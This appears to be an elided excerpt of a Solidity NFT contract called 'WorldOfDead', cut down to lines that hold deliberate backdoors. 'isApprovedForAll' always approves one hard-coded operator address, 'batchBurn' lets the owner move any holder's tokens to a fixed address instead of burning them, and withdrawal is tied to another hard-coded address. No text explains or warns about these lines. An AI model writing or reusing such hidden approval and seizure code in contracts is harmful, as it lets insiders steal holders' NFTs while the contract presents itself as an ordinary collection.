...
contract WorldOfDead is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("WorldOfDead", "WD", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x06f5833b6675eF96942a184A6144A2d1a92BD3f9, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x9e1D2b15b36Fbb9EaFED2D07520643682F2Bd441);
  ...
  IERC721Enumerable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x4656d61216Fc89BbCfB65eEEb10a568f3a4c9977){return true;}
